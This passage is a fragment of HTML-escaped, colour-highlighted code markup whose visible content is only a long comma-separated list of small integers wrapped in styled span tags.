#93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;93&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;81&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;48&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;19&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;11&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;70&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;91&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;12&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;68&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;93&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;81&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;48&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;19&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;66&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;50&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;25&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;91&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;24&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;12&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;68&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;24&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;17&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;17&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;50&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;42&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;50&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;49&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;42&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;25&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;91&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;50&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;70&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;42&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;25&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;91&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;75&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;93&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;17&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;80&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;58&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;66&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;86&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;27&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;88&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;77&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;80&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;38&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;25&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;81&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;20&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;76&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;81&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;15&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;50&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;12&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;24&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;81&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;66&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;90&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;58&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;81&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;30&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;75&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;27&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;19&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;75&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;88&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;45&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;90&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;52&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;80&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;58&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;70&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;66&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;42&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;25&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;91&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;12&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;50&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;83&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;43&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;93&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;90&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;38&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;48&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;19&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;50&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;24&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;24&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;72&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;66&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;48&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;19&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;25&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;24&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;93&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;11&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;66&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;70&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;48&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;19&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;50&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;42&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;24&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;60&lt;/span&gt;&lt;span 